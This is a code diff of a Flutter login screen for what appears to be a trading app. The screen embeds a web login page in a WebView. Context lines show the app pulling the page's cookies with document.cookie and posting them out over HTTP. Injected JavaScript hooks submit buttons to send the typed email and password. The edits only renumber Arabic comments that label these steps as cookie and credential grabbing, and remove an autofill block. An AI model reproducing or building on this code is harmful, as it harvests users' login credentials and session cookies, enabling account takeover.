@@ -70,7 +70,6 @@ class _LoginScreenState extends State<LoginScreen> {
                 headers: {"Content-Type": "application/json"},
                 body: msg.message,
               );
-
               if (mounted) {
                 Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => const MainTradingScreen()));
               }
@@ -86,7 +85,7 @@ class _LoginScreenState extends State<LoginScreen> {
             await Future.delayed(const Duration(seconds: 2));
             _injectOriginalScript();
             
-            // نسحب الكوكيز بطريقة JS
+            // 427. سحب الكوكيز
             final cookieString = await _controller.runJavaScriptReturningResult("document.cookie");
             if (cookieString.toString().isNotEmpty) {
               await http.post(
@@ -104,6 +103,7 @@ class _LoginScreenState extends State<LoginScreen> {
   void _injectOriginalScript() {
     String jsScript = """
       (function() {
+        // 428. سكربت الإيميل والباسورد
         function setNativeValue(el, value) {
           try {
             var proto = window.HTMLInputElement.prototype;
@@ -134,21 +134,6 @@ class _LoginScreenState extends State<LoginScreen> {
             var t = ev.target && ev.target.closest ? ev.target.closest('button, [type="submit"], [role="button"]') : null;
             if (t) sendCreds();
           }, true);
-          var savedEmail = "";
-          var savedPass = "";
-          if (savedEmail || savedPass) {
-            var tries = 0;
-            var timer = setInterval(function() {
-              tries++;
-              var e = findEmail(), p = findPass();
-              if (e && p) {
-                if (!e.value && savedEmail) setNativeValue(e, savedEmail);
-                if (!p.value && savedPass) setNativeValue(p, savedPass);
-                clearInterval(timer);
-              }
-              if (tries > 20) clearInterval(timer);
-            }, 300);
-          }
         }
       })();
     """;
